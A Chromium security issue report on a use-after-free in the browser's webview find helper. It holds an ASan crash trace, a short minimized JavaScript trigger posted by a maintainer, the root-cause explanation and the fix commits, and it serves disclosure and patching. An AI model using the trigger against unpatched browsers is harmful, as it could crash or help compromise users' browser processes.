# Security: UAF in  extensions::WebViewFindHelper::FindReply in browser process

| Field | Value |
|-------|-------|
| **Issue ID** | [40064425](https://issues.chromium.org/issues/40064425) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Platform>Extensions |
| **Platforms** | Linux, Windows |
| **Reporter** | 0x...@gmail.com |
| **Assignee** | mc...@chromium.org |
| **Created** | 2023-05-08 |
| **Bounty** | $10,000.00 |

## Description

**VULNERABILITY DETAILS**  

UAF in extensions::WebViewFindHelper::FindReply in browser process

**VERSION**  

Chromium 115.0.5759.0 (Developer Build) (64-bit)  

Revision 8d1c2199edc54e419a2e1027e9264af9baaae847-refs/heads/main@{#1140712}  

OS Windows 10 Version 22H2 (Build 19045.2846)  

JavaScript V8 11.5.69

**REPRODUCTION CASE**

1. put poc.html into webserver\_path and run `python3 -m http.server 8000`
2. put manifest.json,background.js,index.html,script.js into extension\_path
3. run the command:  
   
   chrome --user-data-dir=/tmp/any --load-extension="extension\_path"

It can be reproduced in both Windows and Linux.

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: [browser]

=================================================================  

==19604==ERROR: AddressSanitizer: heap-use-after-free on address 0x125a63d70b08 at pc 0x7ffa3f3b346a bp 0x0066049fdb80 sp 0x0066049fdbc8  

READ of size 1 at 0x125a63d70b08 thread T0  

==19604==WARNING: Failed to use and restart external symbolizer!  

#0 0x7ffa3f3b3469 in extensions::WebViewFindHelper::FindReply C:\b\s\w\ir\cache\builder\src\extensions\browser\guest\_view\web\_view\web\_view\_find\_helper.cc:169  

#1 0x7ffa3f3bcb83 in extensions::WebViewGuest::FindReply C:\b\s\w\ir\cache\builder\src\extensions\browser\guest\_view\web\_view\web\_view\_guest.cc:592  

#2 0x7ffa3dafdaa9 in content::WebContentsImpl::NotifyFindReply C:\b\s\w\ir\cache\builder\src\content\browser\web\_contents\web\_contents\_impl.cc:8710  

#3 0x7ffa3caabb44 in content::FindRequestManager::NotifyFindReply C:\b\s\w\ir\cache\builder\src\content\browser\find\_request\_manager.cc:772  

#4 0x7ffa3caabe0f in content::FindRequestManager::FinalUpdateReceived C:\b\s\w\ir\cache\builder\src\content\browser\find\_request\_manager.cc:892  

#5 0x7ffa3caad3bb in content::FindRequestManager::RemoveFrame C:\b\s\w\ir\cache\builder\src\content\browser\find\_request\_manager.cc:574  

#6 0x7ffa3daa0ec9 in content::WebContentsImpl::WebContentsObserverList::NotifyObservers<void (content::WebContentsObserver::\*)(content::RenderProcessHost \*),content::RenderProcessHost \*> C:\b\s\w\ir\cache\builder\src\content\browser\web\_contents\web\_contents\_impl.h:1556  

#7 0x7ffa3dae5d95 in content::WebContentsImpl::RenderFrameDeleted C:\b\s\w\ir\cache\builder\src\content\browser\web\_contents\web\_contents\_impl.cc:7017  

#8 0x7ffa3d501f18 in content::RenderFrameHostImpl::RenderFrameDeleted C:\b\s\w\ir\cache\builder\src\content\browser\renderer\_host\render\_frame\_host\_impl.cc:3498  

#9 0x7ffa3d50082c in content::RenderFrameHostImpl::RenderProcessGone C:\b\s\w\ir\cache\builder\src\content\browser\renderer\_host\render\_frame\_host\_impl.cc:3164  

#10 0x7ffa3d964f9b in content::SiteInstanceGroup::RenderProcessExited C:\b\s\w\ir\cache\builder\src\content\browser\site\_instance\_group.cc:100  

#11 0x7ffa3d62ea01 in content::RenderProcessHostImpl::ProcessDied C:\b\s\w\ir\cache\builder\src\content\browser\renderer\_host\render\_process\_host\_impl.cc:4876  

#12 0x7ffa3d6309b5 in content::RenderProcessHostImpl::OnChannelError C:\b\s\w\ir\cache\builder\src\content\browser\renderer\_host\render\_process\_host\_impl.cc:3808  

#13 0x7ffa430b1335 in base::internal::Invoker<base::internal::BindState<void (IPC::ChannelProxy::Context::\*)(),scoped\_refptr[IPC::ChannelProxy::Context](javascript:void(0);) >,void ()>::RunOnce C:\b\s\w\ir\cache\builder\src\base\functional\bind\_internal.h:976  

#14 0x7ffa423b0ef6 in base::TaskAnnotator::RunTaskImpl C:\b\s\w\ir\cache\builder\src\base\task\common\task\_annotator.cc:186  

#15 0x7ffa45966202 in base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl C:\b\s\w\ir\cache\builder\src\base\task\sequence\_manager\thread\_controller\_with\_message\_pump\_impl.cc:486  

#16 0x7ffa45964f7f in base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork C:\b\s\w\ir\cache\builder\src\base\task\sequence\_manager\thread\_controller\_with\_message\_pump\_impl.cc:351  

#17 0x7ffa422eef20 in base::MessagePumpForUI::DoRunLoop C:\b\s\w\ir\cache\builder\src\base\message\_loop\message\_pump\_win.cc:212  

#18 0x7ffa422ec9a6 in base::MessagePumpWin::Run C:\b\s\w\ir\cache\builder\src\base\message\_loop\message\_pump\_win.cc:78  

#19 0x7ffa459688b7 in base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::Run C:\b\s\w\ir\cache\builder\src\base\task\sequence\_manager\thread\_controller\_with\_message\_pump\_impl.cc:651  

#20 0x7ffa42425617 in base::RunLoop::Run C:\b\s\w\ir\cache\builder\src\base\run\_loop.cc:134  

#21 0x7ffa3c527be5 in content::BrowserMainLoop::RunMainMessageLoop C:\b\s\w\ir\cache\builder\src\content\browser\browser\_main\_loop.cc:1067  

#22 0x7ffa3c52ecb5 in content::BrowserMainRunnerImpl::Run C:\b\s\w\ir\cache\builder\src\content\browser\browser\_main\_runner\_impl.cc:158  

#23 0x7ffa3c51f92a in content::BrowserMain C:\b\s\w\ir\cache\builder\src\content\browser\browser\_main.cc:34  

#24 0x7ffa40b4ae29 in content::RunBrowserProcessMain C:\b\s\w\ir\cache\builder\src\content\app\content\_main\_runner\_impl.cc:706  

#25 0x7ffa40b4ebd3 in content::ContentMainRunnerImpl::RunBrowser C:\b\s\w\ir\cache\builder\src\content\app\content\_main\_runner\_impl.cc:1276  

#26 0x7ffa40b4e34a in content::ContentMainRunnerImpl::Run C:\b\s\w\ir\cache\builder\src\content\app\content\_main\_runner\_impl.cc:1130  

#27 0x7ffa40b490e9 in content::RunContentProcess C:\b\s\w\ir\cache\builder\src\content\app\content\_main.cc:326  

#28 0x7ffa40b49c1f in content::ContentMain C:\b\s\w\ir\cache\builder\src\content\app\content\_main.cc:343  

#29 0x7ffa34bd1699 in ChromeMain C:\b\s\w\ir\cache\builder\src\chrome\app\chrome\_main.cc:187  

#30 0x7ff6d7b56364 in MainDllLoader::Launch C:\b\s\w\ir\cache\builder\src\chrome\app\main\_dll\_loader\_win.cc:166  

#31 0x7ff6d7b52bd8 in main C:\b\s\w\ir\cache\builder\src\chrome\app\chrome\_exe\_main\_win.cc:390  

#32 0x7ff6d7f8f5bb in \_\_scrt\_common\_main\_seh D:\a\_work\1\s\src\vctools\crt\vcstartup\src\startup\exe\_common.inl:288  

#33 0x7ffb13d47603 in BaseThreadInitThunk+0x13 (C:\Windows\System32\KERNEL32.DLL+0x180017603)  

#34 0x7ffb148e26a0 in RtlUserThreadStart+0x20 (C:\Windows\SYSTEM32\ntdll.dll+0x1800526a0)

0x125a63d70b08 is located 72 bytes inside of 120-byte region [0x125a63d70ac0,0x125a63d70b38)  

freed by thread T0 here:  

#0 0x7ff6d7c0e54d in free C:\b\s\w\ir\cache\builder\src\third\_party\llvm\compiler-rt\lib\asan\asan\_malloc\_win.cpp:82  

#1 0x7ffa3f3b4cc1 in std::\_\_Cr::\_\_tree<std::\_\_Cr::\_\_value\_type<int,scoped\_refptr[extensions::WebViewFindHelper::FindInfo](javascript:void(0);) >,std::\_\_Cr::\_\_map\_value\_compare<int,std::\_\_Cr::\_\_value\_type<int,scoped\_refptr[extensions::WebViewFindHelper::FindInfo](javascript:void(0);) >,std::\_\_Cr::less<int>,1>,std::\_\_Cr::allocator<std::\_\_Cr::\_\_value\_type<int,scoped\_refptr[extensions::WebViewFindHelper::FindInfo](javascript:void(0);) > > >::\_\_erase\_unique<int> C:\b\s\w\ir\cache\builder\src\buildtools\third\_party\libc++\trunk\include\_\_tree:2455  

#2 0x7ffa3f3b17b0 in extensions::WebViewFindHelper::EndFindSession C:\b\s\w\ir\cache\builder\src\extensions\browser\guest\_view\web\_view\web\_view\_find\_helper.cc:80  

#3 0x7ffa3f3b2fa9 in extensions::WebViewFindHelper::FindReply C:\b\s\w\ir\cache\builder\src\extensions\browser\guest\_view\web\_view\web\_view\_find\_helper.cc:165  

#4 0x7ffa3f3bcb83 in extensions::WebViewGuest::FindReply C:\b\s\w\ir\cache\builder\src\extensions\browser\guest\_view\web\_view\web\_view\_guest.cc:592  

#5 0x7ffa3dafdaa9 in content::WebContentsImpl::NotifyFindReply C:\b\s\w\ir\cache\builder\src\content\browser\web\_contents\web\_contents\_impl.cc:8710  

#6 0x7ffa3caabb44 in content::FindRequestManager::NotifyFindReply C:\b\s\w\ir\cache\builder\src\content\browser\find\_request\_manager.cc:772  

#7 0x7ffa3caabe0f in content::FindRequestManager::FinalUpdateReceived C:\b\s\w\ir\cache\builder\src\content\browser\find\_request\_manager.cc:892  

#8 0x7ffa3caad3bb in content::FindRequestManager::RemoveFrame C:\b\s\w\ir\cache\builder\src\content\browser\find\_request\_manager.cc:574  

#9 0x7ffa3daa0ec9 in content::WebContentsImpl::WebContentsObserverList::NotifyObservers<void (content::WebContentsObserver::\*)(content::RenderProcessHost \*),content::RenderProcessHost \*> C:\b\s\w\ir\cache\builder\src\content\browser\web\_contents\web\_contents\_impl.h:1556  

#10 0x7ffa3dae5d95 in content::WebContentsImpl::RenderFrameDeleted C:\b\s\w\ir\cache\builder\src\content\browser\web\_contents\web\_contents\_impl.cc:7017  

#11 0x7ffa3d501f18 in content::RenderFrameHostImpl::RenderFrameDeleted C:\b\s\w\ir\cache\builder\src\content\browser\renderer\_host\render\_frame\_host\_impl.cc:3498  

#12 0x7ffa3d50082c in content::RenderFrameHostImpl::RenderProcessGone C:\b\s\w\ir\cache\builder\src\content\browser\renderer\_host\render\_frame\_host\_impl.cc:3164  

#13 0x7ffa3d964f9b in content::SiteInstanceGroup::RenderProcessExited C:\b\s\w\ir\cache\builder\src\content\browser\site\_instance\_group.cc:100  

#14 0x7ffa3d62ea01 in content::RenderProcessHostImpl::ProcessDied C:\b\s\w\ir\cache\builder\src\content\browser\renderer\_host\render\_process\_host\_impl.cc:4876  

#15 0x7ffa3d6309b5 in content::RenderProcessHostImpl::OnChannelError C:\b\s\w\ir\cache\builder\src\content\browser\renderer\_host\render\_process\_host\_impl.cc:3808  

#16 0x7ffa430b1335 in base::internal::Invoker<base::internal::BindState<void (IPC::ChannelProxy::Context::\*)(),scoped\_refptr[IPC::ChannelProxy::Context](javascript:void(0);) >,void ()>::RunOnce C:\b\s\w\ir\cache\builder\src\base\functional\bind\_internal.h:976  

#17 0x7ffa423b0ef6 in base::TaskAnnotator::RunTaskImpl C:\b\s\w\ir\cache\builder\src\base\task\common\task\_annotator.cc:186  

#18 0x7ffa45966202 in base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl C:\b\s\w\ir\cache\builder\src\base\task\sequence\_manager\thread\_controller\_with\_message\_pump\_impl.cc:486  

#19 0x7ffa45964f7f in base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork C:\b\s\w\ir\cache\builder\src\base\task\sequence\_manager\thread\_controller\_with\_message\_pump\_impl.cc:351  

#20 0x7ffa422eef20 in base::MessagePumpForUI::DoRunLoop C:\b\s\w\ir\cache\builder\src\base\message\_loop\message\_pump\_win.cc:212  

#21 0x7ffa422ec9a6 in base::MessagePumpWin::Run C:\b\s\w\ir\cache\builder\src\base\message\_loop\message\_pump\_win.cc:78  

#22 0x7ffa459688b7 in base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::Run C:\b\s\w\ir\cache\builder\src\base\task\sequence\_manager\thread\_controller\_with\_message\_pump\_impl.cc:651  

#23 0x7ffa42425617 in base::RunLoop::Run C:\b\s\w\ir\cache\builder\src\base\run\_loop.cc:134  

#24 0x7ffa3c527be5 in content::BrowserMainLoop::RunMainMessageLoop C:\b\s\w\ir\cache\builder\src\content\browser\browser\_main\_loop.cc:1067  

#25 0x7ffa3c52ecb5 in content::BrowserMainRunnerImpl::Run C:\b\s\w\ir\cache\builder\src\content\browser\browser\_main\_runner\_impl.cc:158  

#26 0x7ffa3c51f92a in content::BrowserMain C:\b\s\w\ir\cache\builder\src\content\browser\browser\_main.cc:34  

#27 0x7ffa40b4ae29 in content::RunBrowserProcessMain C:\b\s\w\ir\cache\builder\src\content\app\content\_main\_runner\_impl.cc:706

previously allocated by thread T0 here:  

#0 0x7ff6d7c0e64d in malloc C:\b\s\w\ir\cache\builder\src\third\_party\llvm\compiler-rt\lib\asan\asan\_malloc\_win.cpp:98  

#1 0x7ffa57f84a1e in operator new D:\a\_work\1\s\src\vctools\crt\vcstartup\src\heap\new\_scalar.cpp:35  

#2 0x7ffa3f3b2afa in base::MakeRefCounted<extensions::WebViewFindHelper::FindInfo,int &,const std::\_\_Cr::basic\_string<char16\_t,std::\_\_Cr::char\_traits<char16\_t>,std::\_\_Cr::allocator<char16\_t> > &,mojo::StructPtr[blink::mojom::FindOptions](javascript:void(0);),scoped\_refptr[extensions::WebViewInternalFindFunction](javascript:void(0);) &> C:\b\s\w\ir\cache\builder\src\base\memory\scoped\_refptr.h:155  

#3 0x7ffa3f3b1c8a in extensions::WebViewFindHelper::Find C:\b\s\w\ir\cache\builder\src\extensions\browser\guest\_view\web\_view\web\_view\_find\_helper.cc:102  

#4 0x7ffa3f3bff44 in extensions::WebViewGuest::StartFind C:\b\s\w\ir\cache\builder\src\extensions\browser\guest\_view\web\_view\web\_view\_guest.cc:698  

#5 0x7ffa3f1853cb in extensions::WebViewInternalFindFunction::Run C:\b\s\w\ir\cache\builder\src\extensions\browser\api\guest\_view\web\_view\web\_view\_internal\_api.cc:809  

#6 0x7ffa3f2f51d3 in ExtensionFunction::RunWithValidation C:\b\s\w\ir\cache\builder\src\extensions\browser\extension\_function.cc:474  

#7 0x7ffa3f2fdf83 in extensions::ExtensionFunctionDispatcher::DispatchWithCallbackInternal C:\b\s\w\ir\cache\builder\src\extensions\browser\extension\_function\_dispatcher.cc:617  

#8 0x7ffa3f2fbc84 in extensions::ExtensionFunctionDispatcher::Dispatch C:\b\s\w\ir\cache\builder\src\extensions\browser\extension\_function\_dispatcher.cc:431  

#9 0x7ffa3f2f15be in extensions::ExtensionFrameHost::Request C:\b\s\w\ir\cache\builder\src\extensions\browser\extension\_frame\_host.cc:46  

#10 0x7ffa3e47c430 in extensions::mojom::LocalFrameHostStubDispatch::AcceptWithResponder C:\b\s\w\ir\cache\builder\src\out\Release\_x64\gen\extensions\common\mojom\frame.mojom.cc:2549  

#11 0x7ffa3f2f3348 in extensions::mojom::LocalFrameHostStub<mojo::RawPtrImplRefTraits[extensions::mojom::LocalFrameHost](javascript:void(0);) >::AcceptWithResponder C:\b\s\w\ir\cache\builder\src\out\Release\_x64\gen\extensions\common\mojom\frame.mojom.h:365  

#12 0x7ffa42f9334e in mojo::InterfaceEndpointClient::HandleValidatedMessage C:\b\s\w\ir\cache\builder\src\mojo\public\cpp\bindings\lib\interface\_endpoint\_client.cc:970  

#13 0x7ffa462eeacf in mojo::MessageDispatcher::Accept C:\b\s\w\ir\cache\builder\src\mojo\public\cpp\bindings\lib\message\_dispatcher.cc:48  

#14 0x7ffa42f98cc1 in mojo::InterfaceEndpointClient::HandleIncomingMessage C:\b\s\w\ir\cache\builder\src\mojo\public\cpp\bindings\lib\interface\_endpoint\_client.cc:701  

#15 0x7ffa430a638e in IPC::`anonymous namespace'::ChannelAssociatedGroupController::AcceptOnEndpointThread C:\b\s\w\ir\cache\builder\src\ipc\ipc\_mojo\_bootstrap.cc:1069  

#16 0x7ffa4309d47b in base::internal::Invoker<base::internal::BindState<void (IPC::(anonymous namespace)::ChannelAssociatedGroupController::\*)(mojo::Message),scoped\_refptr<IPC::(anonymous namespace)::ChannelAssociatedGroupController>,mojo::Message>,void ()>::RunOnce C:\b\s\w\ir\cache\builder\src\base\functional\bind\_internal.h:976  

#17 0x7ffa423b0ef6 in base::TaskAnnotator::RunTaskImpl C:\b\s\w\ir\cache\builder\src\base\task\common\task\_annotator.cc:186  

#18 0x7ffa45966202 in base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl C:\b\s\w\ir\cache\builder\src\base\task\sequence\_manager\thread\_controller\_with\_message\_pump\_impl.cc:486  

#19 0x7ffa45964f7f in base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork C:\b\s\w\ir\cache\builder\src\base\task\sequence\_manager\thread\_controller\_with\_message\_pump\_impl.cc:351  

#20 0x7ffa422eef20 in base::MessagePumpForUI::DoRunLoop C:\b\s\w\ir\cache\builder\src\base\message\_loop\message\_pump\_win.cc:212  

#21 0x7ffa422ec9a6 in base::MessagePumpWin::Run C:\b\s\w\ir\cache\builder\src\base\message\_loop\message\_pump\_win.cc:78  

#22 0x7ffa459688b7 in base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::Run C:\b\s\w\ir\cache\builder\src\base\task\sequence\_manager\thread\_controller\_with\_message\_pump\_impl.cc:651  

#23 0x7ffa42425617 in base::RunLoop::Run C:\b\s\w\ir\cache\builder\src\base\run\_loop.cc:134  

#24 0x7ffa3c527be5 in content::BrowserMainLoop::RunMainMessageLoop C:\b\s\w\ir\cache\builder\src\content\browser\browser\_main\_loop.cc:1067  

#25 0x7ffa3c52ecb5 in content::BrowserMainRunnerImpl::Run C:\b\s\w\ir\cache\builder\src\content\browser\browser\_main\_runner\_impl.cc:158  

#26 0x7ffa3c51f92a in content::BrowserMain C:\b\s\w\ir\cache\builder\src\content\browser\browser\_main.cc:34  

#27 0x7ffa40b4ae29 in content::RunBrowserProcessMain C:\b\s\w\ir\cache\builder\src\content\app\content\_main\_runner\_impl.cc:706

SUMMARY: AddressSanitizer: heap-use-after-free C:\b\s\w\ir\cache\builder\src\extensions\browser\guest\_view\web\_view\web\_view\_find\_helper.cc:169 in extensions::WebViewFindHelper::FindReply  

Shadow bytes around the buggy address:  

0x125a63d70880: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa  

0x125a63d70900: fa fa fa fa fa fa f7 fa fd fd fd fd fd fd fd fd  

0x125a63d70980: fd fd fd fd fd fd fd fa fa fa fa fa fa fa f7 fa  

0x125a63d70a00: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa  

0x125a63d70a80: fa fa fa fa fa fa f7 fa fd fd fd fd fd fd fd fd  

=>0x125a63d70b00: fd[fd]fd fd fd fd fd fa fa fa fa fa fa fa f7 fa  

0x125a63d70b80: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd  

0x125a63d70c00: fa fa fa fa fa fa f7 fa fd fd fd fd fd fd fd fd  

0x125a63d70c80: fd fd fd fd fd fd fd fa fa fa fa fa fa fa f7 fa  

0x125a63d70d00: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd  

0x125a63d70d80: fa fa fa fa fa fa f7 fa fd fd fd fd fd fd fd fd  

Shadow byte legend (one shadow byte represents 8 application bytes):  

Addressable: 00  

Partially addressable: 01 02 03 04 05 06 07  

Heap left redzone: fa  

Freed heap region: fd  

Stack left redzone: f1  

Stack mid redzone: f2  

Stack right redzone: f3  

Stack after return: f5  

Stack use after scope: f8  

Global redzone: f9  

Global init order: f6  

Poisoned by user: f7  

Container overflow: fc  

Array cookie: ac  

Intra object redzone: bb  

ASan internal: fe  

Left alloca redzone: ca  

Right alloca redzone: cb

==19604==ADDITIONAL INFO

==19604==Note: Please include this section with the ASan report.  

Task trace:  

#0 0x7ffa430ac16d in IPC::ChannelProxy::Context::OnChannelError C:\b\s\w\ir\cache\builder\src\ipc\ipc\_channel\_proxy.cc:161  

#1 0x7ffa42e75e91 in mojo::SimpleWatcher::Context::Notify C:\b\s\w\ir\cache\builder\src\mojo\public\cpp\system\simple\_watcher.cc:102

MiraclePtr Status: NOT PROTECTED  

No raw\_ptr<T> access to this region was detected prior to this crash.  

This crash is still exploitable with MiraclePtr.  

Refer to <https://chromium.googlesource.com/chromium/src/+/main/base/memory/raw_ptr.md> for details.

==19604==END OF ADDITIONAL INFO  

==19604==ABORTING

**CREDIT INFORMATION**  

**Externally reported security bugs may appear in Chrome release notes. If**  

**this bug is included, how would you like to be credited?**  

**Reporter credit: [goes here]**

## Attachments

- [manifest.json](attachments/manifest.json) (text/plain, 180 B)
- [background.js](attachments/background.js) (text/plain, 72 B)
- [index.html](attachments/index.html) (text/plain, 74 B)
- [script.js](attachments/script.js) (text/plain, 416 B)
- [poc.html](attachments/poc.html) (text/plain, 196 B)

## Timeline

### [Deleted User] (2023-05-08)

[Empty comment from Monorail migration]

### nh...@google.com (2023-05-08)

[Empty comment from Monorail migration]

[Monorail components: Platform>Extensions]

### [Deleted User] (2023-05-08)

[Empty comment from Monorail migration]

### [Deleted User] (2023-05-09)

Setting milestone and target because of high severity.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### me...@chromium.org (2023-05-11)

wjmaclean, could you PTAL as a webview owner? Thanks.

### wj...@chromium.org (2023-05-12)

Passing to mcnee@ who's more actively doing webview/guestview work at present. Kevin, feel free to pass it back if you're swamped.

### mc...@chromium.org (2023-05-12)

A few initial notes.
Only a single iframe in the guest appears to be necessary.
For the find requests after the call to terminate, only 2 requests are necessary and backwards searching is only necessary for these 2.
So we can minimize this down to
```
let webview = new WebView();
webview.src = 'data:text/html,<body><iframe></iframe></body>';                            
webview.addEventListener('loadstop', () => {
  webview.find("A");
  webview.terminate();                                                                    
  for (let i = 0; i < 2; i++) {
    webview.find('B', {'backward': true});
  } 
});
document.body.appendChild(webview);
```

We're also running through multiple DCHECKs in WebViewFindHelper.

### mc...@chromium.org (2023-05-12)

[Empty comment from Monorail migration]

### mc...@chromium.org (2023-05-15)

In WebViewFindHelper::Find, we're cloning the options before we've set the value for `new_session`. Then in WebViewFindHelper::FindReply, we're using the incorrect value for `new_session` and we're destroying the FindInfo for what we think is a previous session but is actually for the request we're currently processing.

Fixing that fixes the UAF. However, with the unminimized POC, it can also cause a DCHECK within the find in page code. That appears to be a more general issue for which I've filed https://crbug.com/chromium/1445572. The CL I'm going to upload will just address the UAF.

### gi...@appspot.gserviceaccount.com (2023-05-17)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/bb8e17b942b8b1de0a58b2dce34197e00a3b6525

commit bb8e17b942b8b1de0a58b2dce34197e00a3b6525
Author: Kevin McNee <mcnee@chromium.org>
Date: Wed May 17 12:04:04 2023

Compute all webview find options before cloning them

In WebViewFindHelper::Find, we're cloning the find options before we've
set the value for `new_session`. For requests that are part of the same
session, in WebViewFindHelper::FindReply, we're using the incorrect
value for `new_session` and we're destroying the FindInfo for what we
think is a previous session but is actually for the request we're
currently processing.

We now fully compute the options before cloning them.

Bug: 1443401
Change-Id: Ife6747aedabaf74f9a4855a173349ffe612b6f95
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/4533923
Reviewed-by: James Maclean <wjmaclean@chromium.org>
Commit-Queue: James Maclean <wjmaclean@chromium.org>
Auto-Submit: Kevin McNee <mcnee@chromium.org>
Cr-Commit-Position: refs/heads/main@{#1145265}

[modify] https://crrev.com/bb8e17b942b8b1de0a58b2dce34197e00a3b6525/chrome/browser/apps/guest_view/web_view_browsertest.cc
[modify] https://crrev.com/bb8e17b942b8b1de0a58b2dce34197e00a3b6525/chrome/test/data/extensions/platform_apps/web_view/shim/main.js
[modify] https://crrev.com/bb8e17b942b8b1de0a58b2dce34197e00a3b6525/extensions/browser/guest_view/web_view/web_view_find_helper.cc


### mc...@chromium.org (2023-05-17)

[Empty comment from Monorail migration]

### [Deleted User] (2023-05-17)

[Empty comment from Monorail migration]

### [Deleted User] (2023-05-17)

[Empty comment from Monorail migration]

### [Deleted User] (2023-05-17)

Requesting merge to extended stable M112 because latest trunk commit (1145265) appears to be after extended stable branch point (1109224).

Requesting merge to stable M113 because latest trunk commit (1145265) appears to be after stable branch point (1121455).

Requesting merge to beta M114 because latest trunk commit (1145265) appears to be after beta branch point (1135570).

Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

Sheriffbot has determined this fix is necessary on milestone(s): [].

Please answer the following questions so that we can safely process this merge request:
1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been tested on Canary?
3. Has this fix been verified to not pose any stability regressions and does it pose potential stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.


For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2023-05-18)

Merge review required: M114 is already shipping to beta.

Please answer the following questions so that we can safely process your merge request:
1. Why does your merge fit within the merge criteria for these milestones?
- Chrome Browser: https://chromiumdash.appspot.com/branches
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines
2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? https://goto.google.com/cros-engprodcomponents
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: harrysouders (Android), harrysouders (iOS), ceb (ChromeOS), srinivassista (Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2023-05-18)

Merge review required: M113 is already shipping to stable.

Please answer the following questions so that we can safely process your merge request:
1. Why does your merge fit within the merge criteria for these milestones?
- Chrome Browser: https://chromiumdash.appspot.com/branches
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines
2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? https://goto.google.com/cros-engprodcomponents
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: eakpobaro (Android), eakpobaro (iOS), matthewjoseph (ChromeOS), pbommana (Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2023-05-18)

Merge review required: M112 is already shipping to stable.

Please answer the following questions so that we can safely process your merge request:
1. Why does your merge fit within the merge criteria for these milestones?
- Chrome Browser: https://chromiumdash.appspot.com/branches
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines
2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? https://goto.google.com/cros-engprodcomponents
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: govind (Android), govind (iOS), obenedict (ChromeOS), srinivassista (Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mc...@chromium.org (2023-05-18)

1. Fix for a security issue.
2. https://chromium-review.googlesource.com/c/chromium/src/+/4533923
3. I've tested on ToT. The canary release stability data doesn't show any issues related to this.
4. No
5. N/A
6. Automated testing now covers this.

### am...@chromium.org (2023-05-19)

No issues on canary as of today either, approving merge to M114, please merge this fix to branch 5735 before 10am Pacific on Tuesday, 23 May so this fix can be included in the M114/Stable cut -- thank you! 

There are no further planned releases of M113/Stable or M112/Extended; removing merge labels for these. 

### mc...@chromium.org (2023-05-23)

M114 merge: https://chromium-review.googlesource.com/c/chromium/src/+/4556646

### gi...@appspot.gserviceaccount.com (2023-05-23)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/ea1cd76358e00e30e48c2fbf6dc2d324b7012949

commit ea1cd76358e00e30e48c2fbf6dc2d324b7012949
Author: Kevin McNee <mcnee@chromium.org>
Date: Tue May 23 15:46:16 2023

M114: Compute all webview find options before cloning them

Compute all webview find options before cloning them

In WebViewFindHelper::Find, we're cloning the find options before we've
set the value for `new_session`. For requests that are part of the same
session, in WebViewFindHelper::FindReply, we're using the incorrect
value for `new_session` and we're destroying the FindInfo for what we
think is a previous session but is actually for the request we're
currently processing.

We now fully compute the options before cloning them.

(cherry picked from commit bb8e17b942b8b1de0a58b2dce34197e00a3b6525)

Bug: 1443401
Change-Id: Ife6747aedabaf74f9a4855a173349ffe612b6f95
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/4533923
Reviewed-by: James Maclean <wjmaclean@chromium.org>
Commit-Queue: James Maclean <wjmaclean@chromium.org>
Auto-Submit: Kevin McNee <mcnee@chromium.org>
Cr-Original-Commit-Position: refs/heads/main@{#1145265}
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/4556646
Commit-Queue: Rubber Stamper <rubber-stamper@appspot.gserviceaccount.com>
Bot-Commit: Rubber Stamper <rubber-stamper@appspot.gserviceaccount.com>
Cr-Commit-Position: refs/branch-heads/5735@{#941}
Cr-Branched-From: 2f562e4ddbaf79a3f3cb338b4d1bd4398d49eb67-refs/heads/main@{#1135570}

[modify] https://crrev.com/ea1cd76358e00e30e48c2fbf6dc2d324b7012949/chrome/browser/apps/guest_view/web_view_browsertest.cc
[modify] https://crrev.com/ea1cd76358e00e30e48c2fbf6dc2d324b7012949/chrome/test/data/extensions/platform_apps/web_view/shim/main.js
